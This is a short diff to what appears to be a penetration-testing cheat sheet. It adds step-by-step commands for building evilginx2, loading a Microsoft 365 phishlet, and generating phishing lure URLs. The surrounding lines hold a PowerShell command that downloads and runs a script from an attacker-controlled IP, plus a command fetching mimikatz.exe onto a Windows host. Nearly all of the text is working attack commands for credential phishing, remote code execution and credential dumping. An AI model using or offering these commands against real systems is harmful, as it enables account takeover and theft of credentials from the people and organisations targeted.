@@ -479,6 +479,18 @@ python3 makers.py -l 192.168.10.11 -p 3389
 ```
 python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -t ps1 -d 1 -c 'iex(new-object net.webclient).downloadstring("http://192.168.10.11/rs.txt")'
 ```
+evilginx usage
+```
+git clone https://github.com/kgretzky/evilginx2
+cd evilginx2
+make
+wget https://raw.githubusercontent.com/BakkerJan/evilginx3/main/microsoft365.yaml -P ./phishlets/
+sudo ./build/evilginx -p ./phishlets -t ./redirectors -developer
+phishlets hostname m365 domain.com
+phishlets enable m365
+lures create m365
+lures get-url 0
+```
 extra sids - krbtgt way (ref lab 16)
 ```
 iwr -uri http://192.168.10.11/mimikatz.exe -outfile c:\windows\tasks\m.exe
